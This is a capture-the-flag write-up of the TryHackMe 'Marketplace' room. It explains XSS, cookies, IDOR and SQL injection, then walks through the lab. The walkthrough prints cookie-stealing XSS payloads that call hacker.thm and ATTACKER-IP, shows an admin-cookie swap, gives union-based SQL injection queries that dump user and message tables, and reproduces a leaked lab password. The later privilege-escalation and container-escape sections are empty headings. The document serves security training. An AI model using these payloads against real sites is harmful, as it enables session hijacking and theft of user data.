---
title: Marketplace CTF Write Up (2023)
date: 2023-10-20
categories: [CTF Write Up, THM]
tags: [xss, idor, cookies, sqli, sudo, wildcard-injection, container-escape]
img_path: /assets/marketplace/
mermaid: true
---

![marketplace_banner](marketplace_banner.png)

## 1 Summary

<!-- Graph summary -->

## 2 Background Information

[The Marketplace](https://tryhackme.com/room/marketplace) room felt like a "real-world" penetration testing scenario, as it has almost no guidance at all:

>The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

And that's all there is! We are now left alone to figure out where those three flags are 🚩🚩🚩🤔 !

There are a lot of concepts involved in this CTF room, so let's see what kind of background knowledge is needed for solving it.

### 2.1 Cross-site Scripting (XSS)

**Cross-site Scripting (XSS)** is an injection attack where the payload, i.e. malicious JavaScript code, gets injected into a web application with the intention of being executed by other users.

Many payload types exist, but the one we are interested in for this room is used for **Session Stealing**, and looks like this:

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

There are also different kinds of XSS, one of them is called **Stored XSS**, which, as the name infers, stores its payload on the web application and then gets run when other users visit the page.

![XSS_image](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/sorted-XSS.png.webp)

If the above information does not make sense, try going through TryHackMe's [XSS](https://tryhackme.com/room/xss) room before attempting this room.

### 2.2 Cookies

**Cookies** are small pieces of data that are stored on our computer, and they are saved when we receive a "*Set-Cookie*" header from a web server. Because *HTTP* is *stateless* (does not keep track of previous requests), cookies can be used to remind the web server who we are. 

Cookies have many uses, but are most commonly used for website authentication. They don't have a plaintext format, so we can't see the password, but they come in the form of a **token**, a unique secret code that isn't easily humanly guessable.

![cookie-auth](https://media.geeksforgeeks.org/wp-content/uploads/20211206163821/Group2copy-660x330.jpg)

As always, there is the [HTTP in detail](https://tryhackme.com/room/httpindetail) room which is dedicated to the **HTTP protocol**, and I would highly suggest to go through that as well! 

### 2.3 Insecure Direct Object Reference (IDOR)

**Insecure Direct Object Reference (IDOR)** is a type of **access control vulnerability**. This can occur when a web server receives user-supplied input to retrieve objects and the **input data is not properly validated** on the server-side to confirm the requested object belongs to the user requesting it.

For example, the following link could open our own profile: `http://online-service.thm/profile?user_id=1305`. If we could see another user's profile by tampering with the `user_id` parameter's value, we have found an IDOR vulnerability.

The above information can be found in TryHackMe's [IDOR](https://tryhackme.com/room/idor) room.

### 2.4 Structured Query Language Injection (SQLi)

**SQLi** is an attack on a web application database server that causes malicious queries to be executed. 

When a web application communicates with a database using input from a user that **hasn't been properly validated**, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas.

![sqli_explained](https://images.spiceworks.com/wp-content/uploads/2022/05/13064935/Functioning-of-an-SQL-Injection.png){: width="60%"}

The process of an SQLi is explained in great detail, in a step-by-step fashion, in the [SQL Injection](https://tryhackme.com/room/sqlinjectionlm) room.

### 2.5 Containers



## 3 CTF Process

### 3.1 Site Enumeration, XSS, and Cookies

Let's start by visiting the website:

![marketplace_homepage](marketplace_homepage.png)

 One of the first things we always do, is checking if there is a [`/robots.txt`](https://moz.com/learn/seo/robotstxt) subdirectory, and in this case there is! It tells us that there is an disallowed `/admin` location, and, as expected, we are not authorized to view it; yet! 

![robots-txt](robots-txt.png)

![admin-dir-no-auth](admin-dir-not-auth.png)

While exploring the site, there are some more things to note down:

1. There is a **Log In** page. It is always worth experimenting with such a page by trying out some default credentials, as it can give us back informative error messages.
2. There is also a **Sign up** page. The **hint** provided on the first question, i.e. "*If you think a listing is breaking the rules, you can report it!*", make us think that we should probably create an account and report a listing.

Let's start by checking the first point:

When trying to log in with random creds, for example, `admin:admin`, we got the following message:

![user-not-found-error](user-not-found-error.png)

The images found on the homepage are having their publishers listed, `michael` and `jake`. If we try to login in with either of the two, we get this:

![invalid-password](invalid-password.png)

So we already have two **valid usernames** at hand, and we could try a *dictionary attack with **hydra** to see if we can find their passwords, a similar process we did at the [Mr Robot](https://cspanias.github.io/posts/Mr-Robot-Write-Up-(2023)/#23-dictionary-attack-with-hydra) room, but, unfortunately, it does not work this time.

Let's try to exploit our second point, the **Sign up** page as well as the author's **hint**, as it should logically guide us to the first 🚩.

When signing up, the *New listing* option appears at the top right menu:

![new-listing](new-listing.jpg){: width="50%"}

We can check if the site is vulnerable to [XSS](https://owasp.org/www-community/attacks/xss/), by writing some simple JavaScript code, and see how the site reacts:

```javascript
<script>alert("XSS!")</script>
```

<video controls="" width="800" height="500" muted="" loop="" autoplay="">
<source src="https://github.com/CSpanias/cspanias.github.io/raw/main/assets/marketplace/xss.mp4" type="video/mp4">
</video>

Now that we know that the site is **vulnerable to XSS**, we can take advantage of the hint. If we visit the **developer's console** (*right-click --> inspect --> console tab*) we can find our **session cookie**:

![session-cookie](document-cookie.png)

The plan is as follows:
1. Open a **python http server**:

    ```shell
    python -m http.server 12345
    ```

2. Create a new listing with code that will **steal another user's cookie and sent it back to us**.

    ```javascript
    <script>fetch("http://ATTACKER-IP:12345/"+document.cookie)</script>
    ```

    ![cookie-stealer](cookie-stealer.png)

3. Now, we need a way to **"force" an admin to interact with our listing**. That is because we want the code to be executed on the admin's browser, and not ours. This is where the reporting hint comes handy. We can create a new listing, report it, and then an admin should come and review it.

    ![report-to-admin](report-to-admin.jpg){: width="50%"}

4. When we click *Report*, we get a message *From System* saying among others: "*One of our admins will evaluate...*". We should have received our session cookie on the python server by now. After a few seconds, we refresh the page, and we have a new message that our post has been reviewed. Alongside that, we also got the admin's cookie!

    ![admin-cookie](admin-cookie.png)

    > Don't get confused because the port is showing as `8888` instead of `12345`. I just had to restart and ended up using another port!

5. All we have to do now, is swapping our cookie with admin's cookie. We can do that via the brower's console:

    ```javascript
    // we need to allow pasting, so we can paste our cookie
    allow pasting
    // set cookie with the value of the admin's cookie
    document.cookie="token=ADMIN_COOKIE"
    ```

    ![cookie-swap](cookie-swap.png)

6. Once we refresh the page, the **Administration panel** appears, which includes our first 🚩🍻!

    ![admin-panel](admin-panel.jpg)

### 3.2 IDOR & SQLi

When clicking on the different users, the address bar changes as follows: `/admin?user=`. So, we have the parameter `?user` to play with, which we can check if it is susceptible to an **IDOR vulnerability**.

The first thing we can do is trying to **break the query**. Usually, putting an `'` at the end does the trick:

![break-query](query-break.png)

The fact that we are getting this error message confirms that existence of an **SQLi vulnerability**, but it is also kind enough to provide us with some extra information and let us know that the server uses *MySQL server*.

We can now try a **Union-Based SQLi** by using the `UNION` clause to extract the information needed. 

1. First, our goal is to get rid of the error message.

    ```sql
    admin?user=1 UNION SELECT 1;--
    ```

    ![sqli-1](sqli-1.png)

    The error message informs us that our `SELECT` statement have a different number of columns. After trying `1,2` and `1,2,3`, we get something that works:

    ```sql
    admin?user=1 UNION SELECT 1,2,3,4;--
    ```

    ![sqli-2](sqli-2.png)

2. Let's try now to enumerate the databases of this site:

    ```sql
    admin?user=1 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
    ```

    ![sqli-3](sqli-3.png)

    The result is displaying the first part of our query: `user=1`, but not the information after the `UNION` clause. That is because it takes the first returned result somewhere in the web site's code and shows just that.

    To bypass this issue, **we need the first query to produce no results**. Since we know that the first user's ID is `1`, we can change the value of the parameter `user` to `0`. By doing that, the `user=0` will return `FALSE` and have no results to show us back, so it will continue with the rest of our query.

    ```sql
    admin?user=0 UNION SELECT group_concat(schema_name),2,3,4 from information_schema.schemata;--
    ```

    ![sqli-4](sqli-4.png)

3. So we have found that there is a database called `marketplace`. Let's find out what tables it contains:

    ```sql
    admin?user=0 UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables where table_schema='marketplace'--
    ```

    ![sqli-5](sqli-5.png)

4. There are 3 tables: `items`, `messages`, and `users`. The latter seems the most useful, as it could contain sensitive data, such as passwords, so let's find out its columns:

    ```sql
    admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns where table_name='users'--
    ```

    ![sqli-6](sqli-6.png)

    Bingo 👌! We can see that the `users` table contains a `password` field 😈, among others.

5. Now we know the column names, we can see all the data of the `users` table:

    ```sql
    admin?user=0 UNION SELECT group_concat(id, ':', username, ':', password, ':', isAdministrator, '\n'),2,3,4 FROM marketplace.users; --
    ```

    ![sqli-7](sqli-7.png)

6. We see that the passwords are not stored in plaintext format, as it is usual the case. Let's also check the `messages` table we found earlier, starting with its columns:

    ```sql
    admin?user=0 UNION SELECT group_concat(column_name),2,3,4 FROM information_schema.columns WHERE table_name='messages';--
    ```

    ![sqli-8](sqli-8.png)

7. Now, let's see its full data:

    ```sql
    admin?user=0 UNION SELECT group_concat(id, ':', message_content, ':', user_from, ':', user_to, ':', is_read, '\n'),2,3,4 FROM marketplace.messages;--
    ```

    ![sqli-9](sqli-9.png)

There is a message revealing a new password 🔒! We know that this password belongs to user `jake`, as the fourth value corresponds to the `user_to` field: `Your new password is: @b_ENXkGYUCAv3zJ:1:3:1`, thus, user `3`. 

### 3.3 Sudo & Wildcard Injection

### 3.4 Container Escape

 🍻🥂🚩🎊🎉